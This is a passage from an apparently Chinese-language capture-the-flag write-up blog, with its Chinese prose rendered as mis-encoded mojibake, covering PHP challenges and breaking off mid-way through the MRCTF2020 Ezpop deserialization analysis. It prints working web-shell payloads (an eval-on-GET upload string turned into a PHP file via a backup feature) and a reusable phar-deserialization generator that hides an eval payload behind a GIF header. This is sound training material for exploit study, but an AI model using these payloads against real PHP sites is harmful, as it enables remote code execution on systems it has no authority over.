class="line">$request&#x3D;isset($_SERVER[&#39;REQUEST_URI&#39;])?$_SERVER[&#39;REQUEST_URI&#39;]:&#39;&#x2F;&#39;;</span><br><span class="line"></span><br><span class="line">$config[&#39;get&#39;]&#x3D;$_GET;</span><br><span class="line">$config[&#39;post&#39;]&#x3D;$_POST;</span><br><span class="line">$config[&#39;file&#39;]&#x3D;$_FILES;</span><br><span class="line"></span><br><span class="line">$parameters&#x3D;explode(&#39;&#x2F;&#39;,explode(&#39;?&#39;, $request)[0]);</span><br><span class="line">$class&#x3D;(isset($parameters[1]) &amp;&amp; !empty($parameters[1]))?$parameters[1]:&#39;home&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$method&#x3D;(isset($parameters[2]) &amp;&amp; !empty($parameters[2]))?$parameters[2]:&#39;index&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $method;</span><br><span class="line"></span><br><span class="line">$config[&#39;class&#39;]&#x3D;$class;</span><br><span class="line">$config[&#39;method&#39;]&#x3D;$method;</span><br><span class="line"></span><br><span class="line">if(!empty($class))&#123;</span><br><span class="line">if(in_array($class, array(&#39;upload&#39;,&#39;home&#39;,&#39;back&#39;)))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$class_init_config&#x3D;call_user_func($class, $config);</span><br><span class="line">&#x2F;&#x2F; print_r($class_init_config);</span><br><span class="line">new $class_init_config[&#39;class&#39;]($class_init_config[&#39;data&#39;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.phpä¸­å®ç°äº†æœ‰ä¸€ä¸ªç±»è‡ªåŠ¨åŠ è½½ï¼Œå¯ä»¥ä»¥<code>http://ip/class/method</code>çš„å½¢å¼å»è°ƒç”¨å¯¹åº”ç±»çš„å‡½æ•°</p><p>//ç±»è‡ªåŠ¨åŠ è½½</p><p><a href="https://www.php.net/manual/zh/language.oop5.autoload.php">https://www.php.net/manual/zh/language.oop5.autoload.php</a></p><p><img src="/2021/09/04/buu/20/image-20210905095559300.png" alt="image-20210905095559300"></p><p><img src="/2021/09/04/buu/20/image-20210905095718327.png" alt="image-20210905095718327"></p><p>ç„¶ååœ¨<code>class</code>æ–‡ä»¶å¤¹ä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«ä¸º</p><p><code>home.class.php</code>ã€ <code>upload.class.php</code> ã€<code>back.class.php</code>ï¼Œåˆ†åˆ«å¯¹åº”ä¸»é¡µã€ä¸Šä¼ å’Œå¤‡ä»½åŠŸèƒ½çš„å®ç°ï¼Œæ¥ä¸‹æ¥å®¡è®¡è¿™ä¸‰ä¸ªæ–‡ä»¶</p><p>æˆ‘ä»¬é‡‡ç”¨åˆ†è€Œç½®ä¹‹æ¥åˆ†æ</p><p>1.upload.class.phpï¼Œä¸Šä¼ åŠŸèƒ½</p><p><img src="/2021/09/04/buu/20/image-20210905100016508.png" alt="image-20210905100016508"></p><p>æ–‡ä»¶è¢«ä¸Šä¼ åˆ°<code>profile</code>ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå¯æ§ï¼Œä½†æ˜¯å…¶åç¼€è¿›è¡Œäº†é™åˆ¶ï¼Œåªèƒ½ç”¨txtï¼Œç„¶åå°±æ˜¯å¤§å°é™åˆ¶ã€‚</p><p>PHP in_array() å‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•</p><p>in_array() å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>å¦‚æœ <em>search</em> å‚æ•°æ˜¯å­—ç¬¦ä¸²ä¸” <em>type</em> å‚æ•°è¢«è®¾ç½®ä¸º TRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚</td></tr><tr><td align="left"><em>array</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚</td></tr><tr><td align="left"><em>type</em></td><td align="left">å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</td></tr></tbody></table><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);</span><br><span class="line"></span><br><span class="line">if (in_array(&quot;Mark&quot;, $people))</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;åŒ¹é…å·²æ‰¾åˆ°&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;åŒ¹é…æœªæ‰¾åˆ°&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>echo â€œåŒ¹é…å·²æ‰¾åˆ°â€</p><p>2.backup.class.php,å¤‡ä»½åŠŸèƒ½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class back&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $method;</span><br><span class="line">    public $dest;</span><br><span class="line"></span><br><span class="line">    function __construct($config)&#123;</span><br><span class="line">        $this-&gt;filename&#x3D;$config[&#39;filename&#39;];</span><br><span class="line">        $this-&gt;method&#x3D;$config[&#39;method&#39;];</span><br><span class="line">        $this-&gt;dest&#x3D;$config[&#39;dest&#39;];</span><br><span class="line">        if(in_array($this-&gt;method, array(&#39;backup&#39;)))&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;method&#125;($this-&gt;filename, $this-&gt;dest);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function backup($filename, $dest)&#123;</span><br><span class="line">        $filename&#x3D;&#39;profile&#x2F;&#39;.$filename;</span><br><span class="line">        if(file_exists($filename))&#123;</span><br><span class="line">            $content&#x3D;htmlspecialchars(file_get_contents($filename),ENT_QUOTES);</span><br><span class="line">            $password&#x3D;$this-&gt;random_code();</span><br><span class="line">            $r[&#39;path&#39;]&#x3D;$this-&gt;_write($dest, $this-&gt;_create($password, $content));</span><br><span class="line">            $r[&#39;password&#39;]&#x3D;$password;</span><br><span class="line">            echo json_encode($r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;* å…ˆéªŒè¯ä¿è¯ä¸ºå¤‡ä»½æ–‡ä»¶å,å†ä¿å­˜ä¸ºç§è—æ–‡ä»¶ *&#x2F;</span><br><span class="line">    private function _write($dest, $content)&#123;</span><br><span class="line">        $f1&#x3D;$dest;</span><br><span class="line">        $f2&#x3D;&#39;private&#x2F;&#39;.$this-&gt;random_code(10).&quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">        $stream_f1 &#x3D; fopen($f1, &#39;w+&#39;);</span><br><span class="line">        fwrite($stream_f1, $content);</span><br><span class="line">        rewind($stream_f1);</span><br><span class="line">        $f1_read&#x3D;fread($stream_f1, 3000);</span><br><span class="line"></span><br><span class="line">        preg_match(&#39;&#x2F;^&lt;\?php \$_GET\[\&quot;password\&quot;\]&#x3D;&#x3D;&#x3D;\&quot;[a-zA-Z0-9]&#123;8&#125;\&quot;\?print\(\&quot;.*\&quot;\):exit\(\); $&#x2F;s&#39;, $f1_read, $matches);</span><br><span class="line"></span><br><span class="line">        if(!empty($matches[0]))&#123;</span><br><span class="line">            copy($f1,$f2);</span><br><span class="line">            fclose($stream_f1);   </span><br><span class="line">            return $f2;     </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            fwrite($stream_f1, &#39;&lt;?php exit(); ?&gt;&#39;);</span><br><span class="line">            fclose($stream_f1);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function _create($password, $content)&#123;</span><br><span class="line">        $_content&#x3D;&#39;&lt;?php $_GET[&quot;password&quot;]&#x3D;&#x3D;&#x3D;&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;;</span><br><span class="line">        return $_content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function random_code($length &#x3D; 8,$chars &#x3D; null)&#123;</span><br><span class="line">        if(empty($chars))&#123;</span><br><span class="line">            $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $count &#x3D; strlen($chars) - 1;</span><br><span class="line">        $code &#x3D; &#39;&#39;;</span><br><span class="line">        while( strlen($code) &lt; $length)&#123;</span><br><span class="line">            $code .&#x3D; substr($chars,rand(0,$count),1);</span><br><span class="line">        &#125;</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºé¦–å…ˆå°†<code>$filename</code>æ‹¼æ¥åˆ°<code>profile/</code>ï¼Œç„¶åæ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œå°†æ–‡ä»¶å†…å®¹è¯»å‡ºæ¥è¿›è¡Œhtmlç¼–ç ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—ç¬¦ä¸²ä½œä¸ºè¯»å–æ–‡ä»¶å†…å®¹çš„å¯†ç ï¼Œ</p><p>ä¹‹åè°ƒç”¨<code>_create()</code>å‡½æ•°ï¼Œå°†å¯†ç å’Œhtmlç¼–ç åçš„æ–‡ä»¶å†…å®¹ï¼Œæ‹¼æ¥åˆ°<code>&#39;&lt;?php $_GET[&quot;password&quot;]===&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;</code>é‡Œï¼Œ</p><p>ä¹‹åè°ƒç”¨<code>_write()</code>å‡½æ•°ï¼Œå°†ä¸Šé¢è¿™æ®µphpä»£ç å†™è¿›<code>private</code>ç›®å½•ï¼Œç„¶åå¯¹æ–‡ä»¶å†…å®¹å†…å®¹è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„æ£€æµ‹ï¼Œè‹¥é€šè¿‡æ£€æµ‹,å°†æ–‡ä»¶å†…å®¹å†™è¿›<code>$dest</code>ï¼Œå¹¶å¤åˆ¶ä¸€ä»½åˆ°<code>$f2</code>ï¼Œè‹¥æ²¡æœ‰é€šè¿‡æ£€æµ‹ï¼Œåˆ™åœ¨<code>$dest</code>ä¸­å†™å…¥<code>&lt;?php exit(); ?&gt;</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç†æ¸…ç¨‹åºå¤§ä½“æµç¨‹åï¼Œå¤§è‡´çš„æ”»å‡»æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªtxtçš„æ–‡ä»¶ï¼Œç„¶åå†é€šè¿‡backç”Ÿæˆphpæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;eval($_GET[0])&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œå¤‡ä»½ï¼Œç”Ÿæˆphpæ–‡ä»¶</p><p><img src="/2021/09/04/buu/20/image-20210905101422842.png" alt="image-20210905101422842"></p><p>æ‰§è¡Œå‚æ•°0</p><p><img src="/2021/09/04/buu/20/image-20210905101726252.png" alt="image-20210905101726252"></p><h4 id="GameExp"><a href="#GameExp" class="headerlink" title="GameExp:"></a>GameExp:</h4><p>è¿™é¢˜ä¹Ÿæ˜¯å‘äº†å¾ˆä¹…å•Š</p><p>é¦–å…ˆæ˜¯ä¸ºäº†åœ¨ç›®å½•ä¸‹ç”Ÿæˆpharæ–‡ä»¶</p><p>éœ€è¦ä¿®æ”¹é…ç½®php.iniï¼Œæ‰¾äº†å¥½ä¹…æ‰è§£å†³ï¼š</p><p><a href="https://blog.csdn.net/weixin_35835030/article/details/116174720">https://blog.csdn.net/weixin_35835030/article/details/116174720</a></p><p>åˆ›å»ºcreatephar.phpæ–‡ä»¶ï¼ˆè¿™ä»¥åå¯ä»¥ç”¨ä½œpharæ–‡ä»¶è§£é¢˜æ¨¡æ¿ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> $output = <span class="string">&#x27;eval($_REQUEST[0]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifâ½‚ä»¶å¤´</span></span><br><span class="line">$o = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†â¾ƒå®šä¹‰meta-dataå­˜â¼Šmanifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.jpg&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„â½‚ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åâ¾ƒåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æœ‰php.exeçš„ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php  createphar.php</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆphp.phar,ç„¶åé‡å‘½åä¸ºphp.gif</p><p>ç„¶ååœ¨registeré¡µé¢æ³¨å†Œæ—¶ä¸Šä¼ è¯¥æ–‡ä»¶</p><p>æ³¨å†Œåéšæ„ï¼Œè¿™é‡Œæˆ‘ç”¨lex</p><p><img src="/2021/09/04/buu/20/image-20210907174315906.png" alt="image-20210907174315906"></p><p>è¿˜å¯ä»¥éªŒè¯ä¸€ä¸‹æ˜¯å¦ä¸Šä¼ æˆåŠŸ</p><p><img src="/2021/09/04/buu/20/image-20210907174611006.png" alt="image-20210907174611006"></p><p>æ¥ç€é‡æ–°æ³¨å†Œä¸€æ¬¡ï¼Œå¹¶ä¸”è¦ç”¨æŠ“åŒ…ä¿®æ”¹ï¼Œç”¨æˆ·åæ³¨æ„è¦ç”¨åˆšåˆšæ³¨å†Œçš„ï¼Œ</p><p>æ¥è§¦å‘ååºåˆ—åŒ–,åœ¨postå¢æ·»å‘½ä»¤</p><p><img src="/2021/09/04/buu/20/image-20210907175822286.png" alt="image-20210907175822286"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020 Ezpop</title>
      <link href="/2021/09/03/buu/19/"/>
      <url>/2021/09/03/buu/19/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00è§£é¢˜"><a href="#0x00è§£é¢˜" class="headerlink" title="0x00è§£é¢˜"></a>0x00è§£é¢˜</h4><p>å€Ÿé‰´åšå®¢</p><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">MRCTF2020]Ezpopâ€”åºåˆ—åŒ–popé“¾_marsxu626çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a></p><p>è¿™é¢˜ä¸»è¦æ˜¯ä»£ç å®¡è®¡ï¼Œè¿˜æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šæ„é€ popé“¾</p><p>ä»£ç å®¡è®¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†è€Œè§£æå‡ ä¸ªä¸åŒçš„ç±»</p><p>1.Modifierç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;<span class="comment">//variableï¼Œå˜é‡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæˆ‘åœ¨æŠŠæ–‡ä»¶æ”¾è¿›seayå®¡è®¡ç³»ç»Ÿé‡Œè·‘çš„æ—¶å€™å°±è·‘å‡ºäº†</p><p>includeæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè€Œè€…ä¹Ÿæ˜¯æˆ‘ä»¬æœ€åè¦è¾¾æˆçš„ç›®çš„ï¼š</p><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpä¼ªåè®®æ¥è¯»å–flagæ–‡ä»¶</p><p>è¿™é‡Œè¿˜æœ‰é­”æ³•æ–¹æ³•<strong>__invoke</strong> ï¼Œå½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è¦æŠŠModifierç±»è°ƒç”¨ä¸ºå‡½æ•°ã€‚</p><p>2.Showç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°äº†è¿™é‡Œçš„_wakeup()å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¸€å®šä¼šé¦–å…ˆè°ƒç”¨å…¶å‡½æ•°ï¼Œè¿‡æ»¤äº†ä¸è€å°‘å…³é”®å­—ï¼Œä½†æ˜¯åƒfilter://ä¼ªåè®®å´æ²¡æœ‰è¿‡æ»¤ã€‚</p><p>è€Œ_toStringæŠŠç±»å½“ä½œå­—ç¬¦ä¸²æ—¶è§¦å‘</p><p>æ‰€ä»¥å¾—å‡ºwakeupæ–¹æ³•å¯ä»¥è§¦å‘tostringæ–¹æ³•</p><p>3.Testç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 